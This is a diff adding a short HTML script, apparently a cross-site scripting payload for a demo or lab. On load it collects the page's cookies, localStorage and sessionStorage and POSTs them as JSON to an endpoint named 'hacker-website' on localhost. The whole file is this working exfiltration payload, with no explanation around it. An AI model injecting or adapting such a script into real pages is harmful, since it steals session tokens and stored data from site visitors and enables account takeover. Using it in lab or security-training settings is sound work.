@@ -1,0 +1,24 @@
+<script>
+    console.log("executing script")
+    function getCookie() {
+        const cookies = document.cookie;
+        const localstore = window.localStorage;
+        const sessionstore = window.sessionStorage;
+        response = fetch(
+            'http://localhost:5000/hacker-website',
+            {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    cookies: cookies,
+                    localstore: localstore,
+                    sessionstore: sessionstore,
+                }),
+            }
+        )
+        return null;
+    }
+    getCookie();
+</script>
